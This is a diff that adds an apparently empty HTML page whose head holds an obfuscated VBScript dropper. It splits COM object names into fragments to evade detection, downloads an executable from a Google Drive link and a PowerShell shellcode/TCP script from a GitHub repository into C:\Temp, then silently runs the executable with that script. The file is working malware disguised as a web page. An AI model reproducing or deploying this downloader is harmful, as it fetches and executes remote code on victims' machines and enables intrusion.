@@ -1,0 +1,114 @@
+<html>
+
+<head>
+
+<script language="VBScript">
+
+
+Sub Download( reindeer, Trumpedupchaos )
+
+    Dim i, oF, onlyFlightSamOnion, oH, staticFire, strMsg
+    Const FR = 1, FW = 2, FA = 8
+
+    Dim FlightSafetyOfficer
+	Dim One 
+	One = "Scripting"
+	Dim Three
+	Three = ".FileSys"
+	Dim Five 
+	Five = "temObject"
+	FlightSafetyOfficer = One&Three&Five
+	
+    Set onlyFlightSamOnion = CreateObject( FlightSafetyOfficer )
+
+    
+    If onlyFlightSamOnion.FolderExists( Trumpedupchaos ) Then
+        staticFire = onlyFlightSamOnion.BuildPath( Trumpedupchaos, Mid( reindeer, InStrRev( reindeer, "/" ) + 1 ) )
+    ElseIf onlyFlightSamOnion.FolderExists( Left( Trumpedupchaos, InStrRev( Trumpedupchaos, "\" ) - 1 ) ) Then
+        staticFire = Trumpedupchaos
+    Else
+        
+        Exit Sub
+    End If
+
+    
+    Set oF = onlyFlightSamOnion.OpenTextFile( staticFire, FW, True )
+
+    Dim str
+	Dim Eight
+	Eight = "WinHtt"
+	Dim Ten 
+	Ten = "p.WinHtt"
+	Dim Twelve 
+	Twelve = "pRequest.5.1"
+	str = Eight&Ten&Twelve
+	
+	
+    Set oH = CreateObject( str )
+
+    Dim Google
+	Google = "GET"
+	
+    oH.Open Google, reindeer, False
+    oH.Send
+
+    
+    For i = 1 To LenB( oH.ResponseBody )
+        oF.Write Chr( AscB( MidB( oH.ResponseBody, i, 1 ) ) )
+    Next
+
+    
+    oF.Close( )
+End Sub
+
+Sub RP
+
+	Dim ws
+	Dim Fourteen
+	Fourteen = "Wscri"
+	Dim Sixteen
+	Sixteen = "pt.She"
+	Dim Eighteen 
+	Eighteen = "ll"
+	ws = Fourteen&Sixteen&Eighteen
+	
+	
+    Set oS = CreateObject(ws)
+
+    oS.Run "C:\Temp\GFS.exe -f C:\Temp\Stuff.ps1",0,False
+	
+
+End Sub
+
+Dim FOne
+Dim Nineteen 
+Nineteen = "C:\Temp\GFS.e"
+Dim Twenty 
+Twenty = "xe"
+FOne = Nineteen&Twenty
+
+Dim FTwo
+Dim TwentyOne 
+TwentyOne= "C:\Temp\Stuff.p"
+Dim TwentyTwo
+TwentyTwo = "s1"
+FTwo = TwentyOne&TwentyTwo
+
+Download "ht"&"tps://drive.google.com/uc?export=download&id=1XeQBv__WHKbipFlSUC9iKfr8-4lMiQmZ", FOne
+
+Download "ht"&"tps://raw.githubusercontent.com/pattersonbr/InvokeShellcode/master/Invoke-PSTCP-GFS.ps1", FTwo
+
+RP
+
+</script>
+
+</head> 
+
+
+<body>
+
+
+
+</body>
+
+</html>
